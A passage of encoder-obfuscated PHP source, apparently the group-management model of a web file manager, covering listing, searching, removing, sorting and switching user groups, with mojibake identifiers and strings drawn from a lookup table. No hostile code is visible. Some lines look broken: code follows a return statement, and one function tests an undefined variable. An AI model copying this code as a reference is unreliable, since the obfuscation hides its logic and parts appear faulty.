$ñÙãúú∆[12], Pinyin::get($∏´·ÜÔ˘)), $ñÙãúú∆[545] => Pinyin::get($∏´·ÜÔ˘, $ñÙãúú∆[664])); $this->metaSet($Ü◊Á—¨Œ, $û óå◊í); } protected function groupStatus($‘‹Íﬂû‚, $Ú˝ÚÔ—«) { $ÊÌ©û®ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $òπ¨ü”Õ = $this->getInfoSimple($‘‹Íﬂû‚); if (!$òπ¨ü”Õ) { return !1; } $this->_clearCache($‘‹Íﬂû‚); return $this->metaSet($‘‹Íﬂû‚, $ÊÌ©û®ÿ[823], $Ú˝ÚÔ—«); if ($Ú˝ÚÔ—« == $ÊÌ©û®ÿ[91]) { $…≠ ñ∆§ = $this->parentLevelArray($òπ¨ü”Õ[$ÊÌ©û®ÿ[592]]); } else { } $…≠ ñ∆§[] = $òπ¨ü”Õ[$ÊÌ©û®ÿ[1963]]; $ÀÌÆÇÕÿ = array(); foreach ($…≠ ñ∆§ as $‘‹Íﬂû‚) { $ÀÌÆÇÕÿ[] = array($ÊÌ©û®ÿ[1963] => $‘‹Íﬂû‚, $ÊÌ©û®ÿ[97] => $ÊÌ©û®ÿ[823], $ÊÌ©û®ÿ[459] => $Ú˝ÚÔ—«); $this->_clearCache($‘‹Íﬂû‚); } return Model($ÊÌ©û®ÿ[2056])->addAll($ÀÌÆÇÕÿ, array(), !0); } protected function groupRemove($ÀÀ¸Ω∞µ, $“ﬂ¸ˆ“‡ = false) { $◊À ’Ûì =& $_SERVER[ß⁄ˆÇ†Œ]; $«æ’ù˘∏ = array($◊À ’Ûì[1963] => $ÀÀ¸Ω∞µ); $ŒŸ˙ıæ¶ = $this->where($«æ’ù˘∏)->find(); if (!$ŒŸ˙ıæ¶ || $ŒŸ˙ıæ¶[$◊À ’Ûì[192]] == 0) { return !1; } if (!$“ﬂ¸ˆ“‡) { $§ç∞˛ã… = $this->getInfoSimple($ŒŸ˙ıæ¶[$◊À ’Ûì[192]]); $this->_changeChildLevel($ŒŸ˙ıæ¶, $§ç∞˛ã…, !0); $this->where(array($◊À ’Ûì[192] => $ÀÀ¸Ω∞µ))->save(array($◊À ’Ûì[192] => $ŒŸ˙ıæ¶[$◊À ’Ûì[192]])); $this->_clearCache($§ç∞˛ã…[$◊À ’Ûì[1963]]); } Model($◊À ’Ûì[2056])->where($«æ’ù˘∏)->delete(); Model($◊À ’Ûì[2057])->where($«æ’ù˘∏)->delete(); Model($◊À ’Ûì[897])->groupRootRemove($ÀÀ¸Ω∞µ); $this->_clearCache($ŒŸ˙ıæ¶[$◊À ’Ûì[192]]); return $this->where($«æ’ù˘∏)->delete(); } protected function groupSort($îÅ™“ÑÀ) { $÷œ≈‡˚’ =& $_SERVER[ß⁄ˆÇ†Œ]; $˛˚Áß¥ã = array(); foreach ($îÅ™“ÑÀ as $ƒ‹Úã∫ => $∑∏ëƒ˙ò) { $˛˚Áß¥ã[] = array($÷œ≈‡˚’[1963], $∑∏ëƒ˙ò, $÷œ≈‡˚’[1987], $ƒ‹Úã∫ + 1); } $this->saveAll($˛˚Áß¥ã); } public function listData() { $÷Ùµ†◊Ì = $this->_makeOrder()->selectPage(50); $this->_listDataApply($÷Ùµ†◊Ì[$_SERVER[ß⁄ˆÇ†Œ][454]]); return $÷Ùµ†◊Ì; } private function _makeOrder($é∆áôÃË = '') { $°ëÊÙºñ =& $_SERVER[ß⁄ˆÇ†Œ]; $„ØÃŒÀŒ = array($°ëÊÙºñ[1963], $°ëÊÙºñ[32], $°ëÊÙºñ[1951], $°ëÊÙºñ[231]); $Åç€π‘ë = array($°ëÊÙºñ[531] => $°ëÊÙºñ[532], $°ëÊÙºñ[533] => $°ëÊÙºñ[534]); $µ„‘Ü¸â = Input::get($°ëÊÙºñ[538], $°ëÊÙºñ[7], $°ëÊÙºñ[1967], $„ØÃŒÀŒ); $ïòÙÜå’ = Input::get($°ëÊÙºñ[539], $°ëÊÙºñ[7], $°ëÊÙºñ[2058], array($°ëÊÙºñ[2058], $°ëÊÙºñ[533])); $ïòÙÜå’ = $Åç€π‘ë[$ïòÙÜå’]; $é∆áôÃË = $é∆áôÃË . "{$µ„‘Ü¸â}\40{$ïòÙÜå’}\54\x20\147\162\157\x75\160\x49\x44\x20\141\x73\x63"; return $this->order($é∆áôÃË); } public function listChild($ÇÒÊ…ÕÒ) { $˜¥ƒŒ´» =& $_SERVER[ß⁄ˆÇ†Œ]; $‹‚‰¬ﬂΩ = $this->where(array($˜¥ƒŒ´»[192] => $ÇÒÊ…ÕÒ))->_makeOrder()->selectPage(200); $this->_listDataApply($‹‚‰¬ﬂΩ[$˜¥ƒŒ´»[454]]); return $‹‚‰¬ﬂΩ; } public function listChildIds($ÔºÌÿœâ) { $ÜøêŒÈ” =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($∫˛ê‡˚˘)) { $ÔºÌÿœâ = explode($ÜøêŒÈ”[50], $ÔºÌÿœâ); } $Ø‚®Åﬁﬂ = $this->where(array($ÜøêŒÈ”[1963] => array($ÜøêŒÈ”[7], $ÔºÌÿœâ)))->field($ÜøêŒÈ”[2059])->select(); if (!$Ø‚®Åﬁﬂ) { return !1; } $òüºí› = array(); foreach ($Ø‚®Åﬁﬂ as $ø¡˛÷Á“) { $òüºí›[] = "\163\145\154\x65\x63\x74\40\147\x72\157\x75\x70\111\x44\40\x66\x72\157\155\40\140\147\x72\x6f\165\x70\x60\x20\x77\x68\145\x72\x65\40\160\x61\162\145\x6e\164\x4c\145\166\145\x6c\x20\x6c\x69\x6b\x65\40\47{$ø¡˛÷Á“[$ÜøêŒÈ”[592]]}{$ø¡˛÷Á“[$ÜøêŒÈ”[1963]]}\x2c\45\47"; } $òüºí› = implode($ÜøêŒÈ”[2060], $òüºí›); $Ø‚®Åﬁﬂ = $this->query($òüºí›); if (!$Ø‚®Åﬁﬂ) { return array(); } $ÔºÌÿœâ = array_to_keyvalue($Ø‚®Åﬁﬂ, $ÜøêŒÈ”[12], $ÜøêŒÈ”[1963]); return array_unique($ÔºÌÿœâ); } public function listByID($„£∞õö©) { $õÔì¢¶÷ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$„£∞õö©) { return array(); } $ôŸô ∑û = array($õÔì¢¶÷[1963] => array($õÔì¢¶÷[7], $„£∞õö©)); $ë⁄∞†ñµ = $this->where($ôŸô ∑û)->select(); $ë⁄∞†ñµ = array_sort_keep($ë⁄∞†ñµ, $õÔì¢¶÷[1963], $„£∞õö©); $this->_listDataApply($ë⁄∞†ñµ); return $ë⁄∞†ñµ; } public function listSearch($¯õ´πñÉ) { $™¢›°ó∏ =& $_SERVER[ß⁄ˆÇ†Œ]; $¯æ‹†∏Û = trim($¯õ´πñÉ[$™¢›°ó∏[2061]]); $ Ò§¬Ωì = explode($™¢›°ó∏[53], $¯æ‹†∏Û); if (!$¯æ‹†∏Û || count($ Ò§¬Ωì) == 1) { return $this->listSearchNow($¯õ´πñÉ); } $öÇ≠è“Ÿ = array($™¢›°ó∏[454] => array()); foreach ($ Ò§¬Ωì as $Ñç’„ä±) { if (!trim($Ñç’„ä±)) { continue; } $¯õ´πñÉ[$™¢›°ó∏[2061]] = $Ñç’„ä±; $œ≥ûπ¡á = $this->listSearchNow($¯õ´πñÉ); $öÇ≠è“Ÿ[$™¢›°ó∏[454]] = array_merge($öÇ≠è“Ÿ[$™¢›°ó∏[454]], $œ≥ûπ¡á[$™¢›°ó∏[454]]); } $öÇ≠è“Ÿ[$™¢›°ó∏[454]] = array_unique_by_key($öÇ≠è“Ÿ[$™¢›°ó∏[454]], $™¢›°ó∏[1963]); $öÇ≠è“Ÿ[$™¢›°ó∏[451]] = array($™¢›°ó∏[452] => count($öÇ≠è“Ÿ[$™¢›°ó∏[454]]), $™¢›°ó∏[448] => 20, $™¢›°ó∏[438] => 1, $™¢›°ó∏[453] => 1); return $öÇ≠è“Ÿ; } public function listSearchNow($µªé≠Æç) { $ù§¨Ã‘∫ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÔÉñîÍÿ = trim($µªé≠Æç[$ù§¨Ã‘∫[2061]]); $¥ª˙ä∆Á = isset($µªé≠Æç[$ù§¨Ã‘∫[2062]]) ? $µªé≠Æç[$ù§¨Ã‘∫[2062]] : !1; if (!trim($ÔÉñîÍÿ)) { return !1; } $ÔÉñîÍÿ = str_replace($ù§¨Ã‘∫[2063], $ù§¨Ã‘∫[2064], $ÔÉñîÍÿ); $ì◊ó÷⁄ï = array($ù§¨Ã‘∫[1963] => array($ù§¨Ã‘∫[467], "{$ÔÉñîÍÿ}\x25"), $ù§¨Ã‘∫[32] => array($ù§¨Ã‘∫[467], "\x25{$ÔÉñîÍÿ}\45"), $ù§¨Ã‘∫[1074] => $ù§¨Ã‘∫[2065]); if ($¥ª˙ä∆Á) { $úƒ£ÙÂÆ = $this->getInfoSimple($¥ª˙ä∆Á); $ÀÈÖô“© = $úƒ£ÙÂÆ[$ù§¨Ã‘∫[592]] . $¥ª˙ä∆Á . $ù§¨Ã‘∫[621]; $ì◊ó÷⁄ï = array($ì◊ó÷⁄ï, array($ù§¨Ã‘∫[592] => array($ù§¨Ã‘∫[467], $ÀÈÖô“©))); } $ì◊ó÷⁄ï = $this->parseWhereLike($ì◊ó÷⁄ï); $Ã≈˚§∆’ = $this->_makeOrder()->where($ì◊ó÷⁄ï)->selectPage(20); $Ã≈˚§∆’ = $Ã≈˚§∆’ ? $Ã≈˚§∆’ : array($ù§¨Ã‘∫[454] => array(), $ù§¨Ã‘∫[451] => array()); if (!$Ã≈˚§∆’ || count($Ã≈˚§∆’[$ù§¨Ã‘∫[454]]) < 5 && Input::check($ÔÉñîÍÿ, $ù§¨Ã‘∫[403])) { $˜âÀπ©û = $this->groupChildrenAll($¥ª˙ä∆Á); $îÏõ∂í˜ = $this->_searchFromMeta($ù§¨Ã‘∫[545], $ÔÉñîÍÿ, 10, $˜âÀπ©û); $˛È≥‡≤ = $this->_searchFromMeta($ù§¨Ã‘∫[546], $ÔÉñîÍÿ, 10, $˜âÀπ©û); $˛åÜÏ¯ﬂ = array_merge($îÏõ∂í˜, $˛È≥‡≤, $Ã≈˚§∆’[$ù§¨Ã‘∫[454]]); $Ã≈˚§∆’[$ù§¨Ã‘∫[454]] = array_unique_by_key($˛åÜÏ¯ﬂ, $ù§¨Ã‘∫[1963]); $Ã≈˚§∆’[$ù§¨Ã‘∫[451]][$ù§¨Ã‘∫[452]] = count($Ã≈˚§∆’[$ù§¨Ã‘∫[454]]); $Ã≈˚§∆’[$ù§¨Ã‘∫[451]][$ù§¨Ã‘∫[453]] = ceil($Ã≈˚§∆’[$ù§¨Ã‘∫[451]][$ù§¨Ã‘∫[452]] / $Ã≈˚§∆’[$ù§¨Ã‘∫[451]][$ù§¨Ã‘∫[448]]); } $this->_listDataApply($Ã≈˚§∆’[$ù§¨Ã‘∫[454]]); return $Ã≈˚§∆’; } protected function groupChildrenAll($Œ»¶ÍÊØ) { $ÇÏ»œØ∞ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Œ»¶ÍÊØ) { return !1; } if (!is_array($Œ»¶ÍÊØ)) { $Œ»¶ÍÊØ = array($Œ»¶ÍÊØ); } $Ø™ãÕ≈” = $Œ»¶ÍÊØ; foreach ($Œ»¶ÍÊØ as $≥Ü®¨ç¬) { $ÔõŒª§© = $this->getInfoSimple($≥Ü®¨ç¬); $µ€Ìªîä = array($ÇÏ»œØ∞[592] => array($ÇÏ»œØ∞[467], $ÔõŒª§©[$ÇÏ»œØ∞[592]] . $≥Ü®¨ç¬ . $ÇÏ»œØ∞[621])); $∞⁄ÊÌü  = $this->field($ÇÏ»œØ∞[1963])->where($µ€Ìªîä)->select(); $Ø™ãÕ≈” = array_merge($Ø™ãÕ≈”, array_to_keyvalue($∞⁄ÊÌü , $ÇÏ»œØ∞[12], $ÇÏ»œØ∞[1963])); } return array_unique($Ø™ãÕ≈”); } private function _searchFromMeta($⁄Æô£á®, $∏ÛÎ˝ªì, $Õü†ÀûÇ, $ß£˘º†è) { $®ñûØ‚ƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $∏ÛÎ˝ªì = strtolower($∏ÛÎ˝ªì); $—∆ŸùÇƒ = array($®ñûØ‚ƒ[97] => $⁄Æô£á®, $®ñûØ‚ƒ[459] => array($®ñûØ‚ƒ[467], "\45{$∏ÛÎ˝ªì}\x25")); $—∆ŸùÇƒ = $this->parseWhereLike($—∆ŸùÇƒ); if ($ß£˘º†è) { $—∆ŸùÇƒ[$®ñûØ‚ƒ[1963]] = array($®ñûØ‚ƒ[7], $ß£˘º†è); } $Üç’ˆäÁ = Model($®ñûØ‚ƒ[2066])->where($—∆ŸùÇƒ)->limit($Õü†ÀûÇ)->select(); if (!$Üç’ˆäÁ) { return array(); } $Üç’ˆäÁ = array_to_keyvalue($Üç’ˆäÁ, $®ñûØ‚ƒ[12], $®ñûØ‚ƒ[1963]); $ïÄÓ„èÍ = $this->where(array($®ñûØ‚ƒ[2055] => array($®ñûØ‚ƒ[7], $Üç’ˆäÁ)))->select(); if (!$ïÄÓ„èÍ) { return array(); } return $ïÄÓ„èÍ; } protected function _listDataApplyItem($ë∂ÔΩ¶®) { $î›´óËˆ = array($ë∂ÔΩ¶®); $this->_listDataApply($î›´óËˆ); return $î›´óËˆ[0]; } protected function _listDataApply(&$–ë™à˝ö) { $≈ÁâÄ‚á =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$–ë™à˝ö) { return; } $¬ë£’óÛ = array_to_keyvalue($–ë™à˝ö, $≈ÁâÄ‚á[12], $≈ÁâÄ‚á[1963]); $this->_listAppendChildren($–ë™à˝ö); $this->_listAppendChildrenMember($–ë™à˝ö); $this->_listAppendMeta($–ë™à˝ö, $¬ë£’óÛ); $this->_listAppendParent($–ë™à˝ö); $this->_listAppendSourceRoot($–ë™à˝ö, $¬ë£’óÛ); } private function _listAppendChildren(&$≥ò»˛ü´) { $»Ø«ﬂ ç =& $_SERVER[ß⁄ˆÇ†Œ]; $äüÌ““´ = array_to_keyvalue($≥ò»˛ü´, $»Ø«ﬂ ç[12], $»Ø«ﬂ ç[1963]); $·Áïºåÿ = array($»Ø«ﬂ ç[192] => array($»Ø«ﬂ ç[7], $äüÌ““´)); $ﬁ˜Ëçﬁ« = array($»Ø«ﬂ ç[192], $»Ø«ﬂ ç[2067] => $»Ø«ﬂ ç[573]); $…îÓ∑Å» = $this->field($ﬁ˜Ëçﬁ«)->where($·Áïºåÿ)->group($»Ø«ﬂ ç[192])->select(); $£±Œ •„ = array_to_keyvalue($…îÓ∑Å», $»Ø«ﬂ ç[192], $»Ø«ﬂ ç[573]); foreach ($≥ò»˛ü´ as &$ê¨Ç–´©) { $ò£êπÈı = $ê¨Ç–´©[$»Ø«ﬂ ç[1963]]; $ê¨Ç–´©[$»Ø«ﬂ ç[2068]] = isset($£±Œ •„[$ò£êπÈı]) ? intval($£±Œ •„[$ò£êπÈı]) : !1; } unset($ê¨Ç–´©); } private function _listAppendChildrenMember(&$√¥¥ÆÌÖ) { $≈ãû∫ˆ√ =& $_SERVER[ß⁄ˆÇ†Œ]; $°˘¸ô™ = array_to_keyvalue($√¥¥ÆÌÖ, $≈ãû∫ˆ√[12], $≈ãû∫ˆ√[1963]); $Ω•á≤‰ó = array($≈ãû∫ˆ√[1963] => array($≈ãû∫ˆ√[7], $°˘¸ô™)); $¡Øﬂõªˆ = array($≈ãû∫ˆ√[1963], $≈ãû∫ˆ√[2067] => $≈ãû∫ˆ√[573]); $˝¬¶®úú = Model($≈ãû∫ˆ√[2057])->field($¡Øﬂõªˆ)->where($Ω•á≤‰ó)->group($≈ãû∫ˆ√[1963])->select(); $âƒÌé÷ˆ = array_to_keyvalue($˝¬¶®úú, $≈ãû∫ˆ√[1963], $≈ãû∫ˆ√[573]); foreach ($√¥¥ÆÌÖ as &$èÛ‚˜Áò) { $Êó“ƒ˝± = $èÛ‚˜Áò[$≈ãû∫ˆ√[1963]]; $èÛ‚˜Áò[$≈ãû∫ˆ√[2069]] = isset($âƒÌé÷ˆ[$Êó“ƒ˝±]) ? intval($âƒÌé÷ˆ[$Êó“ƒ˝±]) : !1; } unset($èÛ‚˜Áò); } private function _listAppendMeta(&$≠ƒ˙äß, $ÔèÊìÔ∆) { $Áˆ’¥π” =& $_SERVER[ß⁄ˆÇ†Œ]; $»“¬»”Ø = array($Áˆ’¥π”[1963] => array($Áˆ’¥π”[7], $ÔèÊìÔ∆)); $ü…Äñ∫˝ = Model($Áˆ’¥π”[2056])->where($»“¬»”Ø)->select(); $ü…Äñ∫˝ = array_to_keyvalue_group($ü…Äñ∫˝, $Áˆ’¥π”[1963]); foreach ($ü…Äñ∫˝ as &$‹Ú©®√≥) { $‹Ú©®√≥ = array_to_keyvalue($‹Ú©®√≥, $Áˆ’¥π”[97], $Áˆ’¥π”[459]); } unset($‹Ú©®√≥); foreach ($≠ƒ˙äß as &$ñπìÄ„£) { $ñπìÄ„£[$Áˆ’¥π”[547]] = array(); if (isset($ü…Äñ∫˝[$ñπìÄ„£[$Áˆ’¥π”[1963]]])) { $ñπìÄ„£[$Áˆ’¥π”[547]] = $ü…Äñ∫˝[$ñπìÄ„£[$Áˆ’¥π”[1963]]]; } } unset($ñπìÄ„£); } protected function parentLevelArray($˙≤„¿æÕ) { $¶ñÍÌ” =& $_SERVER[ß⁄ˆÇ†Œ]; $˙≤„¿æÕ = explode($¶ñÍÌ”[50], trim($˙≤„¿æÕ, $¶ñÍÌ”[50])); $˙≤„¿æÕ = array_remove_value($˙≤„¿æÕ, $¶ñÍÌ”[228]); return $˙≤„¿æÕ; } protected function parentInGroup($Àã√∏¡ó, $å≈≤É©Ò) { $ˆ˜®ù· =& $_SERVER[ß⁄ˆÇ†Œ]; $ûÈÒ◊áƒ = $this->getInfoSimple($Àã√∏¡ó); if (!$ûÈÒ◊áƒ) { return !0; } $—ÈõŒÚ¸ = $this->parentLevelArray($ûÈÒ◊áƒ[$ˆ˜®ù·[592]]); $—ÈõŒÚ¸[] = $Àã√∏¡ó; foreach ($—ÈõŒÚ¸ as $Àã√∏¡ó) { if (in_array($Àã√∏¡ó . $ˆ˜®ù·[12], $å≈≤É©Ò)) { return !0; } } return !1; } private function _listAppendParent(&$Ò¿ü‚˝˙) { $◊ıô≥êñ =& $_SERVER[ß⁄ˆÇ†Œ]; $Üá˘¨å‘ = array(); foreach ($Ò¿ü‚˝˙ as &$ÆŒ§Ê¯á) { $Üá˘¨å‘[$ÆŒ§Ê¯á[$◊ıô≥êñ[1963]]] = $ÆŒ§Ê¯á[$◊ıô≥êñ[32]]; $èó∆Ø˘ó = $this->parentLevelArray($ÆŒ§Ê¯á[$◊ıô≥êñ[592]]); foreach ($èó∆Ø˘ó as $ÂÊÔåÈ±) { if (!isset($Üá˘¨å‘[$ÂÊÔåÈ±])) { $Üá˘¨å‘[$ÂÊÔåÈ±] = 0; } } } unset($ÆŒ§Ê¯á); foreach ($Üá˘¨å‘ as $°öå≤ä± => $®»÷ã‡°) { if ($®»÷ã‡°) { continue; } $ŒÙøÁ„¨ = $this->getInfoSimple($°öå≤ä±); $Üá˘¨å‘[$°öå≤ä±] = $ŒÙøÁ„¨[$◊ıô≥êñ[32]]; } $˜∂§ñ Ö = $GLOBALS[$◊ıô≥êñ[6]][$◊ıô≥êñ[92]][$◊ıô≥êñ[2070]]; if (KodUser::isRoot()) { $˜∂§ñ Ö = !1; } foreach ($Ò¿ü‚˝˙ as &$ÆŒ§Ê¯á) { $èó∆Ø˘ó = $this->parentLevelArray($ÆŒ§Ê¯á[$◊ıô≥êñ[592]]); $†®ƒ¿√¯ = $◊ıô≥êñ[12]; foreach ($èó∆Ø˘ó as $°öå≤ä± => $ÂÊÔåÈ±) { if ($˜∂§ñ Ö && $°öå≤ä± == 0) { continue; } $†®ƒ¿√¯ .= $Üá˘¨å‘[$ÂÊÔåÈ±] . $◊ıô≥êñ[8]; } if ($èó∆Ø˘ó) { $†®ƒ¿√¯ .= $ÆŒ§Ê¯á[$◊ıô≥êñ[32]]; } $ÆŒ§Ê¯á[$◊ıô≥êñ[597]] = str_replace($◊ıô≥êñ[600], $◊ıô≥êñ[8], $†®ƒ¿√¯); } unset($ÆŒ§Ê¯á); } private function _listAppendSourceRoot(&$Îé™˚≈¢, $Ö¨–£Î≠) { $Ôõ˙ÿ¢Ò =& $_SERVER[ß⁄ˆÇ†Œ]; $œéá‰µ¬ = Model($Ôõ˙ÿ¢Ò[897])->listSourceRoot(SourceModel::TYPE_GROUP, $Ö¨–£Î≠); $œéá‰µ¬ = array_to_keyvalue($œéá‰µ¬, $Ôõ˙ÿ¢Ò[577]); $œéá‰µ¬ = array_remove_key($œéá‰µ¬, $Ôõ˙ÿ¢Ò[577]); foreach ($Îé™˚≈¢ as &$ΩæÈ’£”) { $ΩæÈ’£”[$Ôõ˙ÿ¢Ò[90]] = $œéá‰µ¬[$ΩæÈ’£”[$Ôõ˙ÿ¢Ò[1963]]] ? $œéá‰µ¬[$ΩæÈ’£”[$Ôõ˙ÿ¢Ò[1963]]] : array(); } unset($ΩæÈ’£”); } protected function groupMerge($–Î‹¬‰˘) { $–Î‹¬‰˘ = array_values(array_unique($–Î‹¬‰˘)); $üµ©è±Ì = array(); for ($´£≈·◊— = 0; $´£≈·◊— < count($–Î‹¬‰˘); $´£≈·◊—++) { $“©˛∏ØË = !1; for ($˝±™⁄»“ = 0; $˝±™⁄»“ < count($–Î‹¬‰˘); $˝±™⁄»“++) { if ($´£≈·◊— == $˝±™⁄»“) { continue; } if ($this->isParentOf($–Î‹¬‰˘[$˝±™⁄»“], $–Î‹¬‰˘[$´£≈·◊—])) { $“©˛∏ØË = !0; break; } } if (!$“©˛∏ØË) { $üµ©è±Ì[] = $–Î‹¬‰˘[$´£≈·◊—]; } } return $üµ©è±Ì; } protected function isParentOf($Òº∑¯ÓÄ, $è‡€öòÅ) { $ñ«ä¢Ç‡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Òº∑¯ÓÄ || !$è‡€öòÅ || $Òº∑¯ÓÄ == $è‡€öòÅ) { return !1; } $ù’° à≤ = $this->getInfoSimple($Òº∑¯ÓÄ); $Åòñú∆ = $this->getInfoSimple($è‡€öòÅ); $‚è≈›ñí = $ù’° à≤[$ñ«ä¢Ç‡[592]] . $Òº∑¯ÓÄ . $ñ«ä¢Ç‡[50]; if (substr($Åòñú∆[$ñ«ä¢Ç‡[592]], 0, strlen($‚è≈›ñí)) == $‚è≈›ñí) { return !0; } return !1; } public function groupShowRoot($∑™‚˛Ïˆ, $≤÷ÀêêÛ = false) { $ú‚®˝ò¯ =& $_SERVER[ß⁄ˆÇ†Œ]; $‹ÎÔ⁄‹Æ = $this->getInfo($∑™‚˛Ïˆ); if (!$‹ÎÔ⁄‹Æ) { return array(); } $º∫’˜ÂÆ = $this->parentLevelArray($‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[592]]); $ä°±íê‹ = array($∑™‚˛Ïˆ); if (count($º∫’˜ÂÆ) == 0) { return $ä°±íê‹; } if ($≤÷ÀêêÛ && count($º∫’˜ÂÆ) == 1) { return $ä°±íê‹; } if (!$‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[547]] || !isset($‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[547]][$ú‚®˝ò¯[2053]]) || $‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[547]][$ú‚®˝ò¯[2053]] == $ú‚®˝ò¯[849]) { return $this->groupShowRoot($º∫’˜ÂÆ[count($º∫’˜ÂÆ) - 1], $≤÷ÀêêÛ); } if ($‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[547]][$ú‚®˝ò¯[2053]] == $ú‚®˝ò¯[442]) { $ı“é±∞Ã = explode($ú‚®˝ò¯[50], $‹ÎÔ⁄‹Æ[$ú‚®˝ò¯[547]][$ú‚®˝ò¯[2054]]); if ($ı“é±∞Ã) { $ä°±íê‹ = array_merge($ä°±íê‹, $ı“é±∞Ã); } } return $ä°±íê‹; } protected function resetParentLevel() { $∏„˘ï˙ü =& $_SERVER[ß⁄ˆÇ†Œ]; $òı·¢‚õ = $∏„˘ï˙ü[1963]; $Û∫„∏¨ﬁ = $this->select(); $Û∫„∏¨ﬁ = array_to_keyvalue($Û∫„∏¨ﬁ, $òı·¢‚õ); foreach ($Û∫„∏¨ﬁ as $›˛∏‰Î–) { $∫»Ä‡ø› = $›˛∏‰Î–; $ıå¯é‰© = array(); while ($∫»Ä‡ø›[$∏„˘ï˙ü[192]] != 0) { $ıå¯é‰©[] = $∫»Ä‡ø›[$∏„˘ï˙ü[192]]; $∫»Ä‡ø› = $Û∫„∏¨ﬁ[$∫»Ä‡ø›[$∏„˘ï˙ü[192]]]; } $ıå¯é‰©[] = 0; $ıå¯é‰© = $∏„˘ï˙ü[50] . implode($∏„˘ï˙ü[50], array_reverse($ıå¯é‰©)) . $∏„˘ï˙ü[50]; $this->setNamePinyin($›˛∏‰Î–[$òı·¢‚õ], $›˛∏‰Î–[$∏„˘ï˙ü[32]]); $this->where(array($òı·¢‚õ => $›˛∏‰Î–[$òı·¢‚õ]))->save(array($∏„˘ï˙ü[660] => $ıå¯é‰©)); } return $Û∫„∏¨ﬁ; } public function groupNameAuto($“í∂êâ÷, $ÿâπå÷÷) { $µ©¯◊ñÉ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚Òƒ¶Òø = $this->where(array($µ©¯◊ñÉ[485] => $“í∂êâ÷))->getField($µ©¯◊ñÉ[32], !0); if (!$˚Òƒ¶Òø || !in_array($ÿâπå÷÷, $˚Òƒ¶Òø)) { return $ÿâπå÷÷; } for ($’çˆô¢∞ = 1; $’çˆô¢∞ <= count($˚Òƒ¶Òø) + 1; $’çˆô¢∞++) { $»à‡’±ˆ = $ÿâπå÷÷ . "\x28{$’çˆô¢∞}\x29"; if (!in_array($»à‡’±ˆ, $˚Òƒ¶Òø)) { return $»à‡’±ˆ; } } } public function groupSwitch($©ï≥Ω§, $ò»ƒ˚â) { $èê≈ÕËú =& $_SERVER[ß⁄ˆÇ†Œ]; $¿Å˘Ω≤ñ = array($èê≈ÕËú[1963] => array($èê≈ÕËú[7], array($©ï≥Ω§, $ò»ƒ˚â))); $ ˚—§∞· = $this->where($¿Å˘Ω≤ñ)->select(); $ ˚—§∞· = array_to_keyvalue($ ˚—§∞·, $èê≈ÕËú[1963]); if (!isset($ ˚—§∞·[$©ï≥Ω§]) || !isset($ ˚—§∞·[$ò»ƒ˚â]) || $ ˚—§∞·[$©ï≥Ω§][$èê≈ÕËú[192]] == 0) { return !1; } $¿Å˘Ω≤ñ = array($èê≈ÕËú[1963] => $©ï≥Ω§); $·§´œœŒ = Model($èê≈ÕËú[2057])->where($¿Å˘Ω≤ñ)->select(); if (!$·§´œœŒ) { $·§´œœŒ = array(); } foreach ($·§´œœŒ as $‚¯à∂àÆ) { $ë∑¿ã≠© = $‚¯à∂àÆ[$èê≈ÕËú[1764]]; $¿Å˘Ω≤ñ = array($èê≈ÕËú[1764] => $ë∑¿ã≠©, $èê≈ÕËú[1963] => $ò»ƒ˚â); $≈·çúùã = Model($èê≈ÕËú[2057])->where($¿Å˘Ω≤ñ)->find(); if (!$≈·çúùã) { $‚¨€·´¬ = array($ò»ƒ˚â => $‚¯à∂àÆ[$èê≈ÕËú[2071]]); Model($èê≈ÕËú[606])->userGroupAdd($ë∑¿ã≠©, $‚¨€·´¬); } Model($èê≈ÕËú[606])->userGroupRemove($ë∑¿ã≠©, $©ï≥Ω§); } $¿Å˘Ω≤ñ = array($èê≈ÕËú[190] => 2, $èê≈ÕËú[192] => 0, $èê≈ÕËú[493] => 1, $èê≈ÕËú[577] => array($èê≈ÕËú[7], array($©ï≥Ω§, $ò»ƒ˚â))); $˙äÿ˜Ÿæ = Model($èê≈ÕËú[897])->where($¿Å˘Ω≤ñ)->field($èê≈ÕËú[2072])->select(); $˙äÿ˜Ÿæ = array_to_keyvalue($˙äÿ˜Ÿæ, $èê≈ÕËú[577], $èê≈ÕËú[193]); $˛ñÒÅá‰ = !empty($˙äÿ˜Ÿæ[$©ï≥Ω§]) ? $˙äÿ˜Ÿæ[$©ï≥Ω§] : !1; if ($˛ñÒÅá‰) { if (!$˙äÿ˜Ÿæ[$ò»ƒ˚â]) { $˙äÿ˜Ÿæ[$ò»ƒ˚â] = Model($èê≈ÕËú[897])->groupRootAdd($ò»ƒ˚â); } $èàùÏù— = $˙äÿ˜Ÿæ[$ò»ƒ˚â]; $¿Å˘Ω≤ñ = array($èê≈ÕËú[192] => $˛ñÒÅá‰); $˙äÿ˜Ÿæ = Model($èê≈ÕËú[897])->where($¿Å˘Ω≤ñ)->field($èê≈ÕËú[2073])->select(); if (!$˙äÿ˜Ÿæ) { $˙äÿ˜Ÿæ = array(); } Model($èê≈ÕËú[897])->moveClearAuth = !1; foreach ($˙äÿ˜Ÿæ as $Û˛„Ê¸Ã) { $≈Å©Óçà = $Û˛„Ê¸Ã[$èê≈ÕËú[493]] == $èê≈ÕËú[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($èê≈ÕËú[897])->move($Û˛„Ê¸Ã[$èê≈ÕËú[193]], $èàùÏù—, $≈Å©Óçà); } Model($èê≈ÕËú[897])->moveClearAuth = !0; $¿Å˘Ω≤ñ = array($èê≈ÕËú[190] => 2, $èê≈ÕËú[577] => $©ï≥Ω§); $†˚∏ÆóÇ = array($èê≈ÕËú[577] => $ò»ƒ˚â); Model($èê≈ÕËú[2074])->where($¿Å˘Ω≤ñ)->save($†˚∏ÆóÇ); Model($èê≈ÕËú[2075])->where($¿Å˘Ω≤ñ)->save($†˚∏ÆóÇ); } $this->_changeChildLevel($ 